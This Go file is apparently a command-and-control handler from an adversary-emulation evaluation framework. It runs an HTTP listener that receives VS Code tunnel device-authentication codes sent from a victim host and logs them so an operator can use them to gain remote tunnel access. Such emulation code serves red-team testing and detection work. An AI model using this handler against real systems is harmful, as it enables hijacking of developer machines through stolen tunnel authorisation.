package vscode_tunnel

import (
    "context"
    "io/ioutil"
    "net/http"
    "regexp"
    "time"

    "evals.mitre.org/control_server/config"
    "evals.mitre.org/control_server/handlers/base_handler"
    "evals.mitre.org/control_server/handlers/handler_manager"

    "github.com/gorilla/mux"
)

const (
    SERVER_ERR_MSG = "Internal server error\n"
    HANDLER_NAME   = "vscode_tunnel"
)

type VSCodeTunnelHandler struct {
    baseHandler *base_handler.BaseHandlerUtil

    // to be initialized after init()
    server *http.Server
}

func vSCodeTunnelHandlerFactory() *VSCodeTunnelHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &VSCodeTunnelHandler{
        baseHandler: baseHandler,
    }
}

// Creates and adds the example C2 handler to the map of available C2 handlers.
func init() {
    handler_manager.RegisterAvailableHandler(vSCodeTunnelHandlerFactory())
}

func (v *VSCodeTunnelHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the handler
func (v *VSCodeTunnelHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // process the information from the configuration entry and use it to initialize the remaining handler variables, if any

    // set the bind and REST API addresses for the base handler
    err := v.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    v.baseHandler.SetRestApiAddr(restAddress)
    v.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", v.baseHandler.Name, v.baseHandler.BindAddr)

    // initialize URL router
    urlRouter := mux.NewRouter()

    // bind HTTP routes to their functions - these functions will handle things like fetching tasks and files, uploading task results and files
    urlRouter.HandleFunc("/code", v.HandleCodeSubmission).Methods("POST")

    v.server = &http.Server{
        Addr:         v.baseHandler.BindAddr,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }

    // start handler in goroutine so it doesn't block
    go func() {
        err := v.server.ListenAndServe()
        if err != nil && err.Error() != "http: Server closed" {
            v.baseHandler.HandlerLogError(err.Error())
        }
    }()

    return nil
}

// StopHandler stops the C2 handler
func (v *VSCodeTunnelHandler) StopHandler() error {
    v.baseHandler.HandlerLogInfo("Stopping %s Handler", v.baseHandler.Name)
    emptyContext := context.Background()
    return v.server.Shutdown(emptyContext)
}

func extractCode(dataStr string) string {
    re := regexp.MustCompile(`([a-fA-F0-9]{4}-[a-fA-F0-9]{4})`)
    matches := re.FindStringSubmatch(dataStr)
    if len(matches) < 2 {
        return ""
    }
    return matches[1]
}

// Handle POST request containing tunnel auth code
func (v *VSCodeTunnelHandler) HandleCodeSubmission(w http.ResponseWriter, r *http.Request) {
    // Get upload data
    postBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        v.baseHandler.HandlerLogError("Failed to read POST body for file upload: %s", err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    dataStr := string(postBody)
    if len(dataStr) == 0 {
    	v.baseHandler.HandlerLogError("Empty data provided.")
    	w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    v.baseHandler.HandlerLogDebug("Received data: %s", dataStr)

    code := extractCode(dataStr)
    if len(code) == 0 {
    	v.baseHandler.HandlerLogError("No code found.")
    	w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    v.baseHandler.HandlerLogSuccess("USE AUTHENTICATION CODE: %s", code)
    w.WriteHeader(http.StatusOK)
    w.Write([]byte("OK"))
}
